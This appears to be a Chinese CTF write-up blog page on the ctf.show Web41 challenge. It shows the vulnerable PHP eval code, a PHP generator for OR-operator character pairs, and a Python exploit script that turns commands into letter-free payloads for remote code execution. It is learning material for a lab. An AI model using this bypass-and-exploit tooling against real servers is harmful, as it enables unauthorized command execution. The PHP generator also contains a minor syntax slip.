<!doctype html><html lang=zh dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Web41 | 🌇 Endless Soar.</title><meta name=keywords content="代码审计,preg_match绕过,命令执行,无字母数字RCE"><meta name=description content="

[!Important]
RCE无字母数字构造_或
0x01
访问靶场，回显源码


 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22


<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval(&#34;echo($c);&#34;);
    }
}else{
    highlight_file(__FILE__);
}
?>


0x02

[!Note]"><meta name=author content="AuranLu"><link rel=canonical href=http://localhost:1313/posts/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/><meta name=google-site-verification content="auranlu"><meta name=yandex-verification content="auranlu"><meta name=msvalidate.01 content="auranlu"><link crossorigin=anonymous href=/assets/css/stylesheet.36819bea596090d8b48cf10d9831382996197aa7e4fc86f792f7c08c9ca4d23b.css integrity="sha256-NoGb6llgkNi0jPENmDE4KZYZeqfk/Ib3kvfAjJyk0js=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon.ico><link rel=apple-touch-icon href=http://localhost:1313/favicon.ico><link rel=mask-icon href=http://localhost:1313/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh href=http://localhost:1313/posts/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="http://localhost:1313/posts/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/"><meta property="og:site_name" content="🌇 Endless Soar."><meta property="og:title" content="Web41"><meta property="og:description" content="
[!Important]
RCE无字母数字构造_或
0x01 访问靶场，回显源码
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 <?php /* # -*- coding: utf-8 -*- # @Author: 羽 # @Date: 2020-09-05 20:31:22 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:40:07 # @email: 1341963450@qq.com # @link: https://ctf.show */ if(isset($_POST['c'])){ $c = $_POST['c']; if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){ eval(&#34;echo($c);&#34;); } }else{ highlight_file(__FILE__); } ?> 0x02 [!Note]"><meta property="og:locale" content="zh"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-03-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-03-10T00:00:00+00:00"><meta property="article:tag" content="代码审计"><meta property="article:tag" content="Preg_match绕过"><meta property="article:tag" content="命令执行"><meta property="article:tag" content="无字母数字RCE"><meta name=twitter:card content="summary"><meta name=twitter:title content="Web41"><meta name=twitter:description content="

[!Important]
RCE无字母数字构造_或
0x01
访问靶场，回显源码


 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22


<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval(&#34;echo($c);&#34;);
    }
}else{
    highlight_file(__FILE__);
}
?>


0x02

[!Note]"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Web41","item":"http://localhost:1313/posts/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Web41","name":"Web41","description":"\n[!Important]\nRCE无字母数字构造_或\n0x01 访问靶场，回显源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: 羽 # @Date: 2020-09-05 20:31:22 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:40:07 # @email: 1341963450@qq.com # @link: https://ctf.show */ if(isset($_POST[\u0026#39;c\u0026#39;])){ $c = $_POST[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;, $c)){ eval(\u0026#34;echo($c);\u0026#34;); } }else{ highlight_file(__FILE__); } ?\u0026gt; 0x02 [!Note]\n","keywords":["代码审计","preg_match绕过","命令执行","无字母数字RCE"],"articleBody":"\n[!Important]\nRCE无字母数字构造_或\n0x01 访问靶场，回显源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u003c?php /* # -*- coding: utf-8 -*- # @Author: 羽 # @Date: 2020-09-05 20:31:22 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:40:07 # @email: 1341963450@qq.com # @link: https://ctf.show */ if(isset($_POST['c'])){ $c = $_POST['c']; if(!preg_match('/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i', $c)){ eval(\"echo($c);\"); } }else{ highlight_file(__FILE__); } ?\u003e 0x02 [!Note]\n代码审计可知，数字字母字段被过滤，同时过滤了一些字符，异或^，~取反均无法使用。() |未被过滤，故可以采取或方法构造函数payload，编写脚本\n或运算字符php生成脚本rec_or.php，输出可字符化且\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u003c?php $myfile = fopen(\"rce_or.txt\", \"w\"); $contents=\"\"; for ($i=0; $i \u003c 256; $i++) { for ($j=0; $j \u003c256 ; $j++) { if($i\u003c16){ $hex_i='0'.dechex($i); } else{ $hex_i=dechex($i); } if($j\u003c16){ $hex_j='0'.dechex($j); } else{ $hex_j=dechex($j); } $preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-/i'; if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ continue; } else{ $a='%'.$hex_i; $b='%'.$hex_j;. $c=(urldecode($a)|urldecode($b)); if (ord($c)\u003e=32\u0026ord($c)\u003c=126) { $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; } } } } fwrite($myfile,$contents); fclose($myfile); 自动化传参python脚本exp.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 # -*- coding: utf-8 -*- import requests import urllib from sys import * import os os.system(\"php rce_or.php\") #没有将php写入环境变量需手动运行 if(len(argv)!=2): print(\"=\"*50) print('USER：python exp.py ') print(\"eg： python exp.py http://ctf.show/\") print(\"=\"*50) exit(0) url=argv[1] def action(arg): s1=\"\" s2=\"\" for i in arg: f=open(\"rce_or.txt\",\"r\") while True: t=f.readline() if t==\"\": break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\" return(output) while True: param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\")) data={ 'c':urllib.parse.unquote(param) } r=requests.post(url,data=data) print(\"\\n[*] result:\\n\"+r.text) 0x03 使用脚本传参远程执行ls后发现flag.php，打开flag.php后发现flag\n","wordCount":"540","inLanguage":"zh","datePublished":"2025-03-10T00:00:00Z","dateModified":"2025-03-10T00:00:00Z","author":{"@type":"Person","name":"AuranLu"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web41/"},"publisher":{"@type":"Organization","name":"🌇 Endless Soar.","logo":{"@type":"ImageObject","url":"http://localhost:1313/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="⛺Home (Alt + H)">⛺Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/posts/ title=Posts><span>POSTS 🗯</span></a></li><li><a href=http://localhost:1313/archives/ title=/Archives🕑><span>ARCHIVES📄</span></a></li><li><a href=http://localhost:1313/tags/ title=Tags><span>TAGS🔖</span></a></li><li><a href=http://localhost:1313/search/ title=/SEARCH><span>SEARCH🔍</span></a></li><li><a href=http://localhost:1313/about/ title=👇🤓👆康康驾到👇🤓👆通通闪开><span>ABOUT👇🤓👆</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>主页</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Web41</h1><div class=post-meta><span title='2025-03-10 00:00:00 +0000 UTC'>2025-03-10</span>&nbsp;·&nbsp;AuranLu</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#0x01>0x01</a></li><li><a href=#0x02>0x02</a></li><li><a href=#0x03>0x03</a></li></ul></nav></div></details></div><div class=post-content><p><img alt=image-20250306131136955 loading=lazy src=https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250306131136955.png></p><blockquote><p>[!Important]</p><p>RCE无字母数字构造_或</p></blockquote><h2 id=0x01>0x01<a hidden class=anchor aria-hidden=true href=#0x01>#</a></h2><p>访问靶场，回显源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/*
</span></span><span class=line><span class=cl># -*- coding: utf-8 -*-
</span></span><span class=line><span class=cl># @Author: 羽
</span></span><span class=line><span class=cl># @Date:   2020-09-05 20:31:22
</span></span><span class=line><span class=cl># @Last Modified by:   h1xa
</span></span><span class=line><span class=cl># @Last Modified time: 2020-09-05 22:40:07
</span></span><span class=line><span class=cl># @email: 1341963450@qq.com
</span></span><span class=line><span class=cl># @link: https://ctf.show
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if(isset($_POST[&#39;c&#39;])){
</span></span><span class=line><span class=cl>    $c = $_POST[&#39;c&#39;];
</span></span><span class=line><span class=cl>if(!preg_match(&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;, $c)){
</span></span><span class=line><span class=cl>        eval(&#34;echo($c);&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}else{
</span></span><span class=line><span class=cl>    highlight_file(__FILE__);
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><h2 id=0x02>0x02<a hidden class=anchor aria-hidden=true href=#0x02>#</a></h2><blockquote><p>[!Note]</p><p>代码审计可知，数字字母字段被过滤，同时过滤了一些字符，异或^，~取反均无法使用。<code>()</code> <code>|</code>未被过滤，故可以采取<a href=/posts/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/>或方法构造函数payload</a>，编写脚本</p></blockquote><p>或运算字符php生成脚本rec_or.php，输出可字符化且</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>$myfile = fopen(&#34;rce_or.txt&#34;, &#34;w&#34;);
</span></span><span class=line><span class=cl>$contents=&#34;&#34;;
</span></span><span class=line><span class=cl>for ($i=0; $i &lt; 256; $i++) { 
</span></span><span class=line><span class=cl>	for ($j=0; $j &lt;256 ; $j++) { 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		if($i&lt;16){
</span></span><span class=line><span class=cl>			$hex_i=&#39;0&#39;.dechex($i);
</span></span><span class=line><span class=cl>		}
</span></span><span class=line><span class=cl>		else{
</span></span><span class=line><span class=cl>			$hex_i=dechex($i);
</span></span><span class=line><span class=cl>		}
</span></span><span class=line><span class=cl>		if($j&lt;16){
</span></span><span class=line><span class=cl>			$hex_j=&#39;0&#39;.dechex($j);
</span></span><span class=line><span class=cl>		}
</span></span><span class=line><span class=cl>		else{
</span></span><span class=line><span class=cl>			$hex_j=dechex($j);
</span></span><span class=line><span class=cl>		}
</span></span><span class=line><span class=cl>		$preg = &#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;;
</span></span><span class=line><span class=cl>		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
</span></span><span class=line><span class=cl>					continue;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>		else{
</span></span><span class=line><span class=cl>		$a=&#39;%&#39;.$hex_i;
</span></span><span class=line><span class=cl>		$b=&#39;%&#39;.$hex_j;.
</span></span><span class=line><span class=cl>		$c=(urldecode($a)|urldecode($b));
</span></span><span class=line><span class=cl>		if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {
</span></span><span class=line><span class=cl>			$contents=$contents.$c.&#34; &#34;.$a.&#34; &#34;.$b.&#34;\n&#34;;
</span></span><span class=line><span class=cl>		}
</span></span><span class=line><span class=cl>	}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>fwrite($myfile,$contents);
</span></span><span class=line><span class=cl>fclose($myfile);
</span></span></code></pre></td></tr></table></div></div><p>自动化传参python脚本exp.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sys</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;php rce_or.php&#34;</span><span class=p>)</span>  <span class=c1>#没有将php写入环境变量需手动运行</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>argv</span><span class=p>)</span><span class=o>!=</span><span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>   <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>50</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;USER：python exp.py &lt;url&gt;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;eg：  python exp.py http://ctf.show/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>50</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>action</span><span class=p>(</span><span class=n>arg</span><span class=p>):</span>
</span></span><span class=line><span class=cl>   <span class=n>s1</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>   <span class=n>s2</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>   <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>arg</span><span class=p>:</span>
</span></span><span class=line><span class=cl>       <span class=n>f</span><span class=o>=</span><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;rce_or.txt&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>       <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>           <span class=n>t</span><span class=o>=</span><span class=n>f</span><span class=o>.</span><span class=n>readline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>           <span class=k>if</span> <span class=n>t</span><span class=o>==</span><span class=s2>&#34;&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>               <span class=k>break</span>
</span></span><span class=line><span class=cl>           <span class=k>if</span> <span class=n>t</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>==</span><span class=n>i</span><span class=p>:</span>
</span></span><span class=line><span class=cl>               <span class=c1>#print(i)</span>
</span></span><span class=line><span class=cl>               <span class=n>s1</span><span class=o>+=</span><span class=n>t</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>5</span><span class=p>]</span>
</span></span><span class=line><span class=cl>               <span class=n>s2</span><span class=o>+=</span><span class=n>t</span><span class=p>[</span><span class=mi>6</span><span class=p>:</span><span class=mi>9</span><span class=p>]</span>
</span></span><span class=line><span class=cl>               <span class=k>break</span>
</span></span><span class=line><span class=cl>       <span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>   <span class=n>output</span><span class=o>=</span><span class=s2>&#34;(</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=o>+</span><span class=n>s1</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>|</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=o>+</span><span class=n>s2</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>)&#34;</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span><span class=p>(</span><span class=n>output</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>   <span class=n>param</span><span class=o>=</span><span class=n>action</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] your function：&#34;</span><span class=p>)</span> <span class=p>)</span><span class=o>+</span><span class=n>action</span><span class=p>(</span><span class=nb>input</span><span class=p>(</span><span class=s2>&#34;[+] your command：&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>   <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=s1>&#39;c&#39;</span><span class=p>:</span><span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>param</span><span class=p>)</span>
</span></span><span class=line><span class=cl>       <span class=p>}</span>
</span></span><span class=line><span class=cl>   <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] result:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>+</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=0x03>0x03<a hidden class=anchor aria-hidden=true href=#0x03>#</a></h2><p>使用脚本传参远程执行ls后发现flag.php，打开flag.php后发现flag</p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/>代码审计</a></li><li><a href=http://localhost:1313/tags/preg_match%E7%BB%95%E8%BF%87/>Preg_match绕过</a></li><li><a href=http://localhost:1313/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/>命令执行</a></li><li><a href=http://localhost:1313/tags/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/>无字母数字RCE</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="复制";function s(){t.innerHTML="已复制！",setTimeout(()=>{t.innerHTML="复制"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>